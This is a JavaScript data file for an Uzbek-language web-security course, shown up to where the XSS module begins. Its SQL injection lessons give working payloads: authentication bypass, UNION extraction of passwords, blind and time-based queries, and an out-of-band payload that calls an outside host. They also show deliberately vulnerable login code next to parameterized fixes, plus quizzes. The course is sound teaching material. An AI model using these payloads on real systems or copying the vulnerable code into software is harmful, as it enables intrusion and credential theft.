/* =========================================================
   Kurs kontenti: modullar, darslar, testlar
   Blok turlari:
     p     - abzats (HTML)        h2/h3 - sarlavha
     list  - ro'yxat              img   - chizma (SVG)
     algo  - algoritm qadamlari   code  - kod misoli (fayl yoki matn)
     note  - eslatma (info/ok/warn/danger)
     table - jadval               lab   - interaktiv simulyator
   ========================================================= */
const KURS = {
  nomi: "Veb xavfsizligi",
  tavsif: "SQL Injection va XSS hujumlari: nazariya, algoritmlar, Python kodlar va amaliy simulyatorlar",
  modullar: [
    /* ======================= 1-MODUL ======================= */
    {
      id: "kirish", nomi: "Kirish", toliq: "Veb xavfsizligi asoslari", icon: "🛡️", rang: "green",
      tavsif: "Veb ilova qanday ishlaydi, hujum qayerdan kiradi va nima uchun Injection eng xavfli zaifliklardan biri.",
      darslar: [
        {
          id: "1-1", nomi: "Veb xavfsizligiga kirish", vaqt: 15,
          maqsad: ["Veb ilovaning uch qatlamini tushunish", "Axborot xavfsizligining CIA uchligini bilish", "OWASP Top 10 va Injection'ning o'rnini bilish"],
          bloklar: [
            { t: "p", h: "<b>Veb xavfsizligi</b> veb saytlar, veb ilovalar va ular ishlatadigan ma'lumotlarni ruxsatsiz kirish, o'zgartirish va o'chirishdan himoya qilish usullari majmuidir. Bugun bank, davlat xizmatlari, ta'lim va savdo deyarli to'liq veb orqali ishlaydi, shuning uchun bitta zaiflik millionlab foydalanuvchi ma'lumotiga yo'l ochishi mumkin." },
            { t: "h2", h: "Veb ilova qanday tuzilgan?" },
            { t: "p", h: "Oddiy veb ilova uch qismdan iborat: foydalanuvchi brauzeri (klient), ilova mantig'i ishlaydigan veb server va ma'lumotlar saqlanadigan baza. Har bir qatlam o'rtasida ma'lumot almashinadi va aynan shu chegaralarda hujumlar sodir bo'ladi." },
            { t: "img", src: "img/arxitektura.svg", cap: "1-rasm. Veb ilovaning uch qatlami: XSS brauzerda, SQL Injection bazada ishlaydi" },
            { t: "note", k: "info", title: "Asosiy qoida", h: "Foydalanuvchidan kelgan <b>har qanday</b> ma'lumot ishonchsiz hisoblanadi: forma maydonlari, URL parametrlari, cookie, HTTP sarlavhalari, yuklangan fayllar, hatto boshqa servisdan kelgan javoblar ham." },
            { t: "h2", h: "CIA uchligi" },
            { t: "p", h: "Axborot xavfsizligi uchta asosiy xususiyatni himoya qiladi. SQL Injection va XSS ularning uchalasini ham buzishi mumkin:" },
            { t: "table", head: ["Xususiyat", "Ma'nosi", "Injection'da buzilishi"], rows: [
              ["<b>Konfidensiallik</b> (Confidentiality)", "Ma'lumotni faqat ruxsati borlar ko'radi", "UNION SELECT orqali parollar o'g'irlanadi; XSS orqali cookie o'g'irlanadi"],
              ["<b>Yaxlitlik</b> (Integrity)", "Ma'lumot ruxsatsiz o'zgartirilmaydi", "UPDATE/DELETE so'rovlari kiritiladi; XSS sahifa mazmunini o'zgartiradi"],
              ["<b>Mavjudlik</b> (Availability)", "Tizim kerak paytda ishlaydi", "DROP TABLE yoki og'ir so'rovlar xizmatni to'xtatadi"]
            ] },
            { t: "h2", h: "OWASP Top 10" },
            { t: "p", h: "<b>OWASP</b> (Open Worldwide Application Security Project) xalqaro notijorat tashkilot bo'lib, eng keng tarqalgan veb xavflar ro'yxatini muntazam e'lon qiladi. 2021 yilgi ro'yxatda <b>Injection</b> 3-o'rinda turadi va 2021 yildan boshlab XSS ham shu toifaga kiritilgan." },
            { t: "img", src: "img/owasp.svg", cap: "2-rasm. OWASP Top 10 (2021) ro'yxati" },
            { t: "h2", h: "Injection umumiy g'oyasi" },
            { t: "p", h: "Ikkala hujumning ildizi bitta: <b>ma'lumot va kod aralashib ketadi</b>. Dastur foydalanuvchi kiritgan matnni boshqa tilga (SQL, HTML, JavaScript) yopishtiradi, va hujumchi matn ichiga shu tilning buyruqlarini joylaydi." },
            { t: "algo", title: "Injection hujumining umumiy algoritmi", steps: [
              "Hujumchi ilovadagi kiritish nuqtasini topadi (forma, URL parametri, cookie).",
              "Maxsus belgilar (<code>'</code>, <code>&lt;</code>, <code>\"</code>) yuborib, ilova javobi o'zgarishini kuzatadi.",
              "Javobdagi xato yoki farq zaiflik borligini ko'rsatsa, kontekst aniqlanadi (SQL, HTML yoki JS).",
              "Kontekstga mos yuklama (payload) tuziladi: masalan <code>' OR '1'='1</code> yoki <code>&lt;script&gt;</code>.",
              "Yuklama bajariladi va natija olinadi: ma'lumot o'g'irlanadi, autentifikatsiya chetlab o'tiladi yoki skript ishga tushadi."
            ] },
            { t: "note", k: "warn", title: "Qonuniy va axloqiy ogohlantirish", h: "Bu kursdagi barcha misollar faqat <b>o'z kompyuteringizda</b> yoki ruxsat berilgan o'quv muhitida sinash uchun. Boshqa birovning tizimini ruxsatsiz tekshirish O'zbekiston Respublikasi Jinoyat kodeksi (278<sup>1</sup>–278<sup>7</sup>-moddalar) bo'yicha jinoyat hisoblanadi." }
          ],
          test: [
            { q: "CIA uchligidagi \"I\" harfi nimani anglatadi?", o: ["Identifikatsiya", "Yaxlitlik (Integrity)", "Internet", "Izolyatsiya"], a: 1, e: "Integrity: ma'lumot ruxsatsiz o'zgartirilmasligi." },
            { q: "OWASP Top 10 (2021) ro'yxatida Injection nechanchi o'rinda?", o: ["1", "3", "7", "10"], a: 1, e: "A03:2021 Injection. XSS ham shu toifaga kiradi." },
            { q: "Quyidagilardan qaysi biri ishonchsiz ma'lumot manbai EMAS?", o: ["URL parametri", "Cookie", "Dastur kodida yozilgan konstanta", "HTTP sarlavhasi"], a: 2, e: "Dasturchi yozgan konstanta foydalanuvchidan kelmaydi. Qolganlarini hujumchi o'zgartira oladi." },
            { q: "Injection hujumlarining umumiy sababi nima?", o: ["Sekin internet", "Ma'lumot va kodning aralashib ketishi", "Eski brauzer", "Kuchsiz parol"], a: 1, e: "Kiritilgan matn kod sifatida talqin qilinadi." }
          ]
        },
        {
          id: "1-2", nomi: "HTTP va SQL asoslari", vaqt: 20,
          maqsad: ["HTTP so'rov va javob tuzilishini bilish", "SELECT, WHERE, UNION operatorlarini eslash", "Ma'lumot ilovaga qayerlardan kirishini aniqlash"],
          bloklar: [
            { t: "h2", h: "HTTP so'rov va javob" },
            { t: "p", h: "Brauzer serverga <b>HTTP so'rov</b> yuboradi, server esa <b>HTTP javob</b> qaytaradi. Formadagi ma'lumotlar GET so'rovida URL ichida, POST so'rovida esa so'rov tanasida (body) yuboriladi." },
            { t: "code", lang: "http", title: "GET so'rovi (qidiruv)", code: "GET /search?q=kitob&sahifa=2 HTTP/1.1\nHost: dokon.uz\nCookie: sessiya=a8f3c2e1d9\nUser-Agent: Mozilla/5.0" },
            { t: "code", lang: "http", title: "POST so'rovi (login forma)", code: "POST /login HTTP/1.1\nHost: dokon.uz\nContent-Type: application/x-www-form-urlencoded\n\nlogin=ali&parol=qwerty" },
            { t: "p", h: "Bu so'rovdagi <code>q</code>, <code>sahifa</code>, <code>login</code>, <code>parol</code>, <code>Cookie</code> va <code>User-Agent</code> qiymatlarining barchasini hujumchi o'zi xohlagancha yozishi mumkin. Brauzerdagi JavaScript tekshiruvi buni to'xtatmaydi, chunki so'rovni brauzersiz ham yuborish mumkin." },
            { t: "h2", h: "SQL asoslari" },
            { t: "p", h: "<b>SQL</b> (Structured Query Language) relyatsion ma'lumotlar bazasi bilan ishlash tili. SQL Injection'ni tushunish uchun quyidagi operatorlar kerak:" },
            { t: "table", head: ["Operator", "Vazifasi", "Misol"], rows: [
              ["<code>SELECT</code>", "Ma'lumot o'qish", "<code>SELECT login FROM users</code>"],
              ["<code>WHERE</code>", "Shart bo'yicha filtrlash", "<code>WHERE id = 5</code>"],
              ["<code>AND / OR</code>", "Shartlarni birlashtirish", "<code>WHERE a=1 OR b=2</code>"],
              ["<code>UNION</code>", "Ikki so'rov natijasini qo'shish", "<code>SELECT a FROM t1 UNION SELECT b FROM t2</code>"],
              ["<code>--</code>, <code>#</code>, <code>/* */</code>", "Izoh (qolgan qism bajarilmaydi)", "<code>SELECT 1 -- bu izoh</code>"],
              ["<code>'...'</code>", "Matn literali", "<code>WHERE login = 'ali'</code>"]
            ] },
            { t: "code", lang: "sql", title: "Kurs davomida ishlatiladigan jadval", code: "CREATE TABLE users (\n    id     INTEGER PRIMARY KEY,\n    login  TEXT,\n    parol  TEXT,\n    rol    TEXT\n);\n\nINSERT INTO users (login, parol, rol) VALUES\n    ('admin', 'S3cr3t!', 'administrator'),\n    ('ali',   'qwerty',  'talaba'),\n    ('vali',  '12345',   'talaba');\n\n-- Login tekshiruvi odatda shunday so'rov bilan bajariladi:\nSELECT id, login, rol FROM users WHERE login = 'ali' AND parol = 'qwerty';" },
            { t: "h2", h: "Python'da baza bilan ishlash" },
            { t: "p", h: "Kurs misollarida Python'ning ichki <code>sqlite3</code> moduli ishlatiladi, hech narsa o'rnatish shart emas. Asosiy tushunchalar: <b>ulanish</b> (connection), <b>kursor</b> va <b>execute()</b> metodi." },
            { t: "code", lang: "python", title: "sqlite3 bilan ishlash", code: "import sqlite3\n\ncon = sqlite3.connect(\":memory:\")          # xotiradagi vaqtinchalik baza\ncon.execute(\"CREATE TABLE users (id INTEGER, login TEXT)\")\ncon.execute(\"INSERT INTO users VALUES (1, 'ali')\")\n\n# To'g'ri usul: qiymat ? orqali alohida beriladi\nqator = con.execute(\"SELECT * FROM users WHERE login = ?\", (\"ali\",)).fetchone()\nprint(qator)    # (1, 'ali')" },
            { t: "h2", h: "Kiritish nuqtalari xaritasi" },
            { t: "algo", title: "Ilovadagi kiritish nuqtalarini topish algoritmi", steps: [
              "Ilovaning barcha sahifalari va API manzillarini ro'yxatga olish.",
              "Har bir sahifadagi formalar va ularning maydonlarini yozib chiqish.",
              "URL parametrlari (<code>?id=</code>, <code>?q=</code>) va yo'l qismlarini (<code>/user/5</code>) belgilash.",
              "Cookie, sarlavhalar (User-Agent, Referer) va yuklanadigan fayllarni qo'shish.",
              "Har bir nuqta uchun: qiymat qayerga boradi? SQL so'rovgami, HTML sahifagami, JS kodgami?",
              "Natija: \"kirish nuqtasi → foydalanish konteksti\" jadvali. Har bir qator uchun kontekstga mos himoya tanlanadi."
            ] }
          ],
          test: [
            { q: "POST so'rovida forma ma'lumotlari qayerda yuboriladi?", o: ["URL ichida", "So'rov tanasida (body)", "Faqat cookie'da", "DNS orqali"], a: 1, e: "POST ma'lumotlari body qismida keladi." },
            { q: "SQL'da qaysi belgi qatorning qolgan qismini izohga aylantiradi?", o: ["--", "==", "&&", "!!"], a: 0, e: "-- (va MySQL'da #) dan keyingi matn bajarilmaydi." },
            { q: "Brauzerdagi JavaScript validatsiyasi nima uchun yetarli emas?", o: ["U sekin ishlaydi", "So'rovni brauzersiz ham yuborish mumkin", "U faqat Chrome'da ishlaydi", "U parolni ko'rsatadi"], a: 1, e: "Hujumchi curl, Python yoki proxy orqali to'g'ridan-to'g'ri so'rov yuboradi." },
            { q: "UNION operatori nima qiladi?", o: ["Jadvalni o'chiradi", "Ikki SELECT natijasini birlashtiradi", "Parolni shifrlaydi", "Ulanishni yopadi"], a: 1, e: "UNION hujumchiga boshqa jadvaldan ma'lumot qo'shib olish imkonini beradi." }
          ]
        }
      ]
    },

    /* ======================= 2-MODUL ======================= */
    {
      id: "sqli", nomi: "SQL Injection", toliq: "SQL Injection hujumlari", icon: "🗄️", rang: "yellow",
      tavsif: "SQL so'rovga zararli kod kiritish: mexanizmi, turlari, ma'lumot o'g'irlash algoritmlari va himoya usullari.",
      darslar: [
        {
          id: "2-1", nomi: "SQL Injection nima?", vaqt: 25,
          maqsad: ["SQL Injection mexanizmini tushunish", "Autentifikatsiyani chetlash misolini tahlil qilish", "Zaif kodni simulyatorda sinash"],
          bloklar: [
            { t: "p", h: "<b>SQL Injection</b> (SQLi) bu hujumchi ilovaga shunday ma'lumot yuboradiki, u SQL so'rovning bir qismi sifatida bajariladi. Natijada hujumchi so'rov mantiqini o'zgartiradi: parolsiz kiradi, boshqa jadvallarni o'qiydi yoki ma'lumotni o'chiradi." },
            { t: "img", src: "img/sqli-oqim.svg", cap: "3-rasm. Login formadagi matn SQL kodiga aylanishi" },
            { t: "h2", h: "Zaif kod qanday ko'rinadi?" },
            { t: "p", h: "Muammo bitta qatorda: so'rov <b>matnlarni qo'shish</b> (konkatenatsiya) yoki f-string orqali yasalmoqda." },
            { t: "code", lang: "python", kind: "bad", title: "Zaif: f-string bilan so'rov", code: "def login(con, login, parol):\n    sql = f\"SELECT * FROM users WHERE login = '{login}' AND parol = '{parol}'\"\n    return con.execute(sql).fetchone()" },
            { t: "p", h: "Agar foydalanuvchi login maydoniga <code>admin' --</code> yozsa, so'rov quyidagiga aylanadi:" },
            { t: "code", lang: "sql", title: "Hosil bo'lgan so'rov", code: "SELECT * FROM users WHERE login = 'admin' --' AND parol = 'nimadir'\n--                                    ^^ shu yerdan keyin hammasi izoh" },
            { t: "p", h: "Birinchi <code>'</code> belgisi matnni yopadi, <code>--</code> esa parol tekshiruvini izohga aylantiradi. Baza faqat <code>login = 'admin'</code> shartini tekshiradi va hujumchi administrator sifatida kiradi." },
            { t: "h2", h: "Hujum algoritmi" },
            { t: "algo", title: "Autentifikatsiyani chetlab o'tish (bypass) algoritmi", steps: [
              "Login maydoniga bitta <code>'</code> belgisi yuboriladi.",
              "Agar sahifa SQL xatosini ko'rsatsa yoki boshqacha javob bersa, kiritish so'rovga to'g'ridan-to'g'ri qo'shilmoqda.",
              "Matnni yopish uchun <code>'</code>, keyin kerakli shart va oxirida izoh <code>--</code> qo'yiladi.",
              "Ma'lum login uchun: <code>admin' --</code>. Login noma'lum bo'lsa: <code>' OR '1'='1' --</code> (birinchi qator, odatda admin).",
              "So'rov kamida bitta qator qaytarsa, ilova foydalanuvchini tizimga kiritadi."
            ] },
            { t: "h2", h: "Python'da to'liq misol" },
            { t: "p", h: "Quyidagi dastur zaif login funksiyasini besh xil kiritish bilan sinaydi. Uni <code>python 01_sqli_zaif_login.py</code> buyrug'i bilan ishga tushiring." },
            { t: "code", file: "01_sqli_zaif_login.py", lang: "python", kind: "bad" },
            { t: "code", lang: "text", title: "Dastur natijasi (qisqartirilgan)", code: "[Izoh bilan chetlash]  login=\"admin' --\"\n  Bajarilgan SQL: SELECT id, login, rol FROM users WHERE login = 'admin' --' AND parol = 'nimadir'\n  Natija: [(1, 'admin', 'administrator')]\n\n[UNION bilan o'g'irlash]\n  Natija: [(1, 'admin', 'S3cr3t!'), (2, 'ali', 'qwerty'), (3, 'vali', '12345')]" },
            { t: "h2", h: "O'zingiz sinab ko'ring" },
            { t: "p", h: "Quyidagi simulyator brauzerda kichik SQL tahlilchisi bilan ishlaydi. \"Zaif\" va \"Xavfsiz\" rejimlarni almashtirib, bir xil kiritish qanday turli natija berishini ko'ring." },
            { t: "lab", id: "sqli" },
            { t: "note", k: "danger", title: "Haqiqiy oqibatlar", h: "SQL Injection tarixdagi eng katta ma'lumot sizib chiqishlarining sababi bo'lgan. Masalan, 2008 yilda Heartland Payment Systems kompaniyasidan SQLi orqali 130 milliondan ortiq bank karta raqami o'g'irlangan." }
          ],
          test: [
            { q: "Login maydoniga <code>admin' --</code> yozilganda <code>--</code> nima qiladi?", o: ["Parolni o'chiradi", "Qolgan so'rovni izohga aylantiradi", "Jadvalni o'chiradi", "Xato chiqaradi"], a: 1, e: "Parol sharti izohga aylanadi va bajarilmaydi." },
            { q: "Quyidagi qaysi kod SQL Injection'ga zaif?", o: ["execute(\"... WHERE id = ?\", (x,))", "execute(f\"... WHERE id = {x}\")", "execute(\"... WHERE id = :id\", {\"id\": x})", "ORM: User.objects.get(id=x)"], a: 1, e: "f-string qiymatni to'g'ridan-to'g'ri so'rov matniga qo'yadi." },
            { q: "<code>' OR '1'='1</code> nima uchun barcha qatorlarni qaytaradi?", o: ["Chunki '1'='1' har doim rost", "Chunki u parolni topadi", "Chunki baza buzildi", "Chunki u UNION ishlatadi"], a: 0, e: "OR bilan birlashgan har doim rost shart WHERE ni har bir qator uchun rost qiladi." },
            { q: "SQLi borligining birinchi belgisi ko'pincha nima?", o: ["Sahifa tez yuklanadi", "Bitta ' yuborilganda SQL xatosi chiqadi", "Rasm ko'rinmaydi", "Cookie o'chadi"], a: 1, e: "Yopilmagan qo'shtirnoq sintaksis xatosiga olib keladi." }
          ]
        },
        {
          id: "2-2", nomi: "SQL Injection turlari", vaqt: 30,
          maqsad: ["In-band, Blind va Out-of-band turlarini farqlash", "UNION asosidagi hujum bosqichlarini bilish", "Blind SQLi'da binar qidiruv algoritmini tushunish"],
          bloklar: [
            { t: "p", h: "SQL Injection hujumlari natija hujumchiga <b>qaysi kanal orqali</b> qaytishiga qarab uch katta guruhga bo'linadi." },
            { t: "img", src: "img/sqli-turlari.svg", cap: "4-rasm. SQL Injection turlarining tasnifi" },
            { t: "table", head: ["Tur", "Qanday ishlaydi", "Misol yuklama"], rows: [
              ["<b>Error-based</b>", "Baza xato xabarida ma'lumotni ko'rsatadi", "<code>' AND extractvalue(1, concat(0x7e, version())) --</code>"],
              ["<b>Union-based</b>", "UNION orqali boshqa jadval natijasi sahifaga qo'shiladi", "<code>' UNION SELECT login, parol FROM users --</code>"],
              ["<b>Boolean blind</b>", "Sahifa faqat \"bor/yo'q\" ko'rinishida farq qiladi", "<code>' AND substr(parol,1,1)='a' --</code>"],
              ["<b>Time-based blind</b>", "Javob vaqti orqali bilinadi", "<code>'; IF(1=1) WAITFOR DELAY '0:0:5' --</code>"],
              ["<b>Out-of-band</b>", "Baza tashqi serverga DNS/HTTP so'rov yuboradi", "<code>LOAD_FILE(concat('\\\\\\\\', version(), '.x.com\\\\a'))</code>"],
              ["<b>Second-order</b>", "Kiritish avval saqlanadi, keyin boshqa so'rovda ishlaydi", "Ro'yxatdan o'tishda login: <code>admin'--</code>"]
            ] },
            { t: "h2", h: "UNION asosidagi hujum" },
            { t: "p", h: "UNION ikkala SELECT bir xil ustunlar soniga ega bo'lishini talab qiladi. Shuning uchun hujumchi avval ustunlar sonini aniqlaydi." },
            { t: "algo", title: "UNION-based SQLi algoritmi", steps: [
              "Zaif parametrni topish: <code>?id=1'</code> xato beradi.",
              "Ustunlar sonini aniqlash: <code>?id=1 ORDER BY 1--</code>, <code>ORDER BY 2--</code>, ... xato chiqquncha. Xato <code>ORDER BY 4</code> da chiqsa, ustunlar soni 3 ta.",
              "Sahifada ko'rinadigan ustunni topish: <code>?id=-1 UNION SELECT 'a','b','c'--</code>.",
              "Baza haqida ma'lumot: <code>UNION SELECT version(), database(), user()--</code>.",
              "Jadvallar ro'yxati: <code>UNION SELECT table_name, null, null FROM information_schema.tables--</code>.",
              "Kerakli jadvaldan ma'lumot: <code>UNION SELECT login, parol, null FROM users--</code>."
            ] },
            { t: "note", k: "info", title: "Nima uchun id=-1?", h: "Asl so'rov hech narsa qaytarmasligi uchun mavjud bo'lmagan id beriladi. Shunda sahifada faqat UNION qismining natijasi ko'rinadi." },
            { t: "h2", h: "Blind (ko'r) SQL Injection" },
            { t: "p", h: "Ko'p ilovalar xato xabarini yashiradi va so'rov natijasini sahifada ko'rsatmaydi. Lekin javob <b>shartga qarab</b> farq qilsa (masalan, \"mahsulot topildi\" va \"topilmadi\"), hujumchi har bir so'rovda 1 bit ma'lumot oladi. Binar qidiruv bilan bitta belgini taxminan 7 ta so'rovda topish mumkin." },
            { t: "img", src: "img/blind-binar.svg", cap: "5-rasm. Binar qidiruv bilan belgi kodini topish" },
            { t: "algo", title: "Boolean-based blind SQLi: binar qidiruv algoritmi", steps: [
              "Oracle (rost/yolg'on beruvchi) funksiyani aniqlash: <code>?id=1 AND 1=1</code> → \"bor\", <code>?id=1 AND 1=2</code> → \"yo'q\".",
              "Qiymat uzunligini topish: <code>AND length(parol) = n</code> sharti rost bo'lguncha n ni oshirish.",
              "Har bir pozitsiya i uchun: past = 32, yuqori = 126 deb olish.",
              "Toki past &lt; yuqori: orta = (past + yuqori) / 2; agar <code>unicode(substr(parol, i, 1)) &gt; orta</code> rost bo'lsa past = orta + 1, aks holda yuqori = orta.",
              "Belgi = chr(past). Natijaga qo'shish va keyingi pozitsiyaga o'tish.",
              "Murakkablik: n belgi uchun taxminan n · log₂(95) ≈ 7n so'rov."
            ] },
            { t: "code", file: "03_blind_sqli_binar.py", lang: "python" },
            { t: "code", lang: "text", title: "Dastur natijasi", code: "Parol uzunligi: 8\n  1-belgi -> i\n  2-belgi -> ir\n  ...\n  8-belgi -> iris2024\n\nTiklangan qiymat: 'iris2024', jami so'rovlar: 62" },
            { t: "h2", h: "Time-based blind" },
            { t: "p", h: "Sahifa umuman farq qilmasa ham, hujumchi bazani <b>kutishga</b> majbur qiladi: shart rost bo'lsa javob 5 soniya kechikadi. Har bir DBMS'da o'z funksiyasi bor:" },
            { t: "table", head: ["DBMS", "Kechiktirish funksiyasi"], rows: [
              ["MySQL", "<code>SLEEP(5)</code>, <code>BENCHMARK()</code>"],
              ["PostgreSQL", "<code>pg_sleep(5)</code>"],
              ["MS SQL Server", "<code>WAITFOR DELAY '0:0:5'</code>"],
              ["Oracle", "<code>dbms_pipe.receive_message('a', 5)</code>"]
            ] },
            { t: "note", k: "warn", title: "Xulosa", h: "Xato xabarlarini yashirish foydali, lekin u zaiflikni yo'q qilmaydi. Blind SQLi sekinroq, ammo baribir butun bazani o'qib chiqishi mumkin. Yagona ishonchli yechim: so'rovni to'g'ri yozish (keyingi dars)." }
          ],
          test: [
            { q: "Sahifa xato ham, natija ham ko'rsatmaydi, faqat \"topildi/topilmadi\" deydi. Bu qaysi tur?", o: ["Union-based", "Error-based", "Boolean-based blind", "Out-of-band"], a: 2, e: "Faqat rost/yolg'on farqi bor, bu boolean blind." },
            { q: "UNION hujumidan oldin <code>ORDER BY n</code> nima uchun ishlatiladi?", o: ["Saralash uchun", "Ustunlar sonini aniqlash uchun", "Jadvalni o'chirish uchun", "Parolni topish uchun"], a: 1, e: "Xato chiqqan n dan bitta kam ustunlar soni bo'ladi." },
            { q: "Binar qidiruv bilan 95 ta mumkin bo'lgan belgidan birini topish uchun taxminan nechta so'rov kerak?", o: ["1", "7", "47", "95"], a: 1, e: "log₂(95) ≈ 6.6, ya'ni 7 ta so'rov." },
            { q: "PostgreSQL'da time-based hujum uchun qaysi funksiya ishlatiladi?", o: ["SLEEP()", "pg_sleep()", "WAITFOR", "DELAY()"], a: 1, e: "pg_sleep(sekund) PostgreSQL funksiyasi." },
            { q: "Second-order SQLi'ning xususiyati nima?", o: ["Ikki marta tez ishlaydi", "Kiritish avval saqlanib, keyinroq boshqa so'rovda ishlaydi", "Faqat ikkinchi sahifada", "Ikki bazada bir vaqtda"], a: 1, e: "Saqlangan ma'lumot keyinchalik xavfsiz deb hisoblanib, so'rovga qo'shiladi." }
          ]
        },
        {
          id: "2-3", nomi: "SQL Injection'dan himoya", vaqt: 25,
          maqsad: ["Parametrlangan so'rov ishlash prinsipini tushunish", "Ko'p qatlamli himoya choralarini qo'llash", "Zaif kodni xavfsiz kodga aylantira olish"],
          bloklar: [
            { t: "p", h: "SQL Injection'ga qarshi eng samarali va asosiy usul: <b>parametrlangan so'rovlar</b> (prepared statements). Qolgan choralar qo'shimcha qatlamlar hisoblanadi." },
            { t: "img", src: "img/parametr.svg", cap: "6-rasm. Konkatenatsiya va parametrlangan so'rov farqi" },
            { t: "h2", h: "1. Parametrlangan so'rovlar" },
            { t: "p", h: "So'rov shabloni (<code>?</code> belgilari bilan) va qiymatlar bazaga <b>alohida</b> yuboriladi. Baza avval shablonni tahlil qilib, keyin qiymatlarni faqat ma'lumot sifatida qo'yadi. Shu sababli <code>' OR '1'='1</code> shunchaki g'alati login matni bo'lib qoladi." },
            { t: "code", lang: "python", kind: "bad", title: "Zaif", code: "cur.execute(\"SELECT * FROM users WHERE login = '\" + login + \"'\")\ncur.execute(f\"SELECT * FROM users WHERE id = {uid}\")\ncur.execute(\"SELECT * FROM users WHERE login = '%s'\" % login)" },
            { t: "code", lang: "python", kind: "good", title: "Xavfsiz", code: "# sqlite3: ? belgisi\ncur.execute(\"SELECT * FROM users WHERE login = ?\", (login,))\n\n# psycopg2 (PostgreSQL), mysql-connector: %s belgisi, lekin IKKINCHI argument sifatida\ncur.execute(\"SELECT * FROM users WHERE login = %s\", (login,))\n\n# Nomlangan parametrlar\ncur.execute(\"SELECT * FROM users WHERE id = :id\", {\"id\": uid})" },
            { t: "note", k: "warn", title: "Diqqat: %s ikki xil ishlatiladi", h: "<code>\"... %s\" % login</code> bu oddiy matn formatlash va <b>zaif</b>. <code>execute(\"... %s\", (login,))</code> esa drayver parametri va <b>xavfsiz</b>. Farq: qiymat <code>execute()</code> ga alohida argument sifatida berilishi kerak." },
            { t: "h2", h: "2. ORM ishlatish" },
            { t: "p", h: "Django ORM, SQLAlchemy kabi ORM'lar so'rovlarni avtomatik parametrlaydi. Lekin <code>raw()</code>, <code>extra()</code> yoki <code>text()</code> ichida matn qo'shilsa, zaiflik qaytadi." },
            { t: "code", lang: "python", title: "SQLAlchemy misoli", code: "from sqlalchemy import select, text\n\n# Xavfsiz: ORM parametrlaydi\nstmt = select(User).where(User.login == login)\n\n# Xavfsiz: text() bilan nomlangan parametr\nsession.execute(text(\"SELECT * FROM users WHERE login = :l\"), {\"l\": login})\n\n# ZAIF: text() ichida f-string\nsession.execute(text(f\"SELECT * FROM users WHERE login = '{login}'\"))" },
            { t: "h2", h: "3. Parametr qila olmaydigan joylar" },
            { t: "p", h: "Jadval yoki ustun nomlarini, <code>ORDER BY</code> yo'nalishini parametr qilib bo'lmaydi. Ular uchun <b>oq ro'yxat</b> (allowlist) ishlatiladi:" },
            { t: "code", lang: "python", kind: "good", title: "Saralash ustunini oq ro'yxat bilan tekshirish", code: "RUXSAT_USTUNLAR = {\"nomi\": \"nomi\", \"narx\": \"narx\", \"sana\": \"yaratilgan\"}\n\ndef mahsulotlar(con, saralash=\"nomi\", yonalish=\"asc\"):\n    ustun = RUXSAT_USTUNLAR.get(saralash, \"nomi\")      # noma'lum qiymat -> standart\n    yon = \"DESC\" if yonalish.lower() == \"desc\" else \"ASC\"\n    return con.execute(f\"SELECT * FROM mahsulot ORDER BY {ustun} {yon}\").fetchall()" },
            { t: "h2", h: "4. Qo'shimcha qatlamlar" },
            { t: "img", src: "img/himoya-qatlamlari.svg", cap: "7-rasm. Chuqur himoya: bitta qatlam yetishmasa, keyingisi ushlab qoladi" },
            { t: "table", head: ["Chora", "Nima beradi"], rows: [
              ["<b>Kiritishni tekshirish</b>", "id faqat raqam, login faqat <code>[a-zA-Z0-9_]</code>. Noto'g'ri formatni darhol rad etish."],
              ["<b>Minimal huquqlar</b>", "Ilova bazaga faqat kerakli huquqlar bilan ulanadi: DROP, GRANT, FILE huquqlari yo'q."],
              ["<b>Xato xabarlarini yashirish</b>", "Foydalanuvchiga umumiy xabar, batafsil xato faqat log faylga."],
              ["<b>Parollarni xeshlash</b>", "Ma'lumot o'g'irlansa ham parollar ochiq ko'rinmaydi (PBKDF2, bcrypt, Argon2)."],
              ["<b>WAF</b>", "Ma'lum hujum imzolarini tarmoq darajasida bloklaydi. Faqat qo'shimcha chora."],
              ["<b>Kod tahlili va testlar</b>", "SAST vositalari (Bandit, Semgrep) va dinamik test (OWASP ZAP) zaif kodni topadi."]
            ] },
            { t: "algo", title: "Zaif kodni xavfsiz kodga aylantirish algoritmi", steps: [
              "Loyihada <code>execute(</code>, <code>raw(</code>, <code>text(</code> chaqiruvlarini qidirish.",
              "Har bir chaqiruvda so'rov matni <code>+</code>, f-string, <code>%</code> yoki <code>.format()</code> bilan yasalganini tekshirish.",
              "Foydalanuvchi qiymatlarini <code>?</code> yoki <code>:nom</code> joy belgilari bilan almashtirish.",
              "Qiymatlarni <code>execute()</code> ning ikkinchi argumenti sifatida berish.",
              "Jadval va ustun nomlari uchun oq ro'yxat qo'shish.",
              "Hujum yuklamalari bilan unit test yozish va qayta sinash."
            ] },
            { t: "h2", h: "To'liq xavfsiz misol" },
            { t: "code", file: "02_sqli_himoya.py", lang: "python", kind: "good" },
            { t: "code", lang: "text", title: "Dastur natijasi", code: "login='ali'                  -> Xush kelibsiz! id=2, rol=talaba\nlogin=\"admin' --\"            -> Rad etildi: login formati noto'g'ri\nlogin=\"' OR '1'='1\"          -> Rad etildi: login formati noto'g'ri\nlogin='admin'                -> Xush kelibsiz! id=1, rol=administrator\n\nFaqat parametr (validatsiyasiz):\n[] <- bo'sh ro'yxat, hujum ishlamadi" }
          ],
          test: [
            { q: "SQL Injection'ga qarshi ENG asosiy himoya qaysi?", o: ["WAF o'rnatish", "Parametrlangan so'rovlar", "Xato xabarlarini yashirish", "HTTPS"], a: 1, e: "Parametrlar ma'lumotni koddan to'liq ajratadi." },
            { q: "Qaysi qator XAVFSIZ?", o: ["execute(\"... = '%s'\" % x)", "execute(\"... = ?\", (x,))", "execute(\"... = '\" + x + \"'\")", "execute(\"... = {}\".format(x))"], a: 1, e: "Qiymat execute() ga alohida beriladi." },
            { q: "ORDER BY ustun nomini foydalanuvchidan olish kerak. To'g'ri yechim?", o: ["? parametri", "Oq ro'yxatdan tanlash", "html.escape()", "Qo'shtirnoqlarni o'chirish"], a: 1, e: "Identifikatorlarni parametr qilib bo'lmaydi, oq ro'yxat ishlatiladi." },
            { q: "\"Minimal huquqlar\" tamoyili nimani anglatadi?", o: ["Kamroq foydalanuvchi", "Ilova bazaga faqat kerakli huquqlar bilan ulanadi", "Parol qisqa bo'lishi", "Kamroq jadval"], a: 1, e: "SQLi bo'lsa ham zarar cheklanadi." }
          ]
        }
      ]
    },

    /* ======================= 3-MODUL ======================= */
    {
      id: "xss", nomi: "XSS", toliq: "Cross-Site Scripting (XSS)", icon: "📜", rang: "pink",
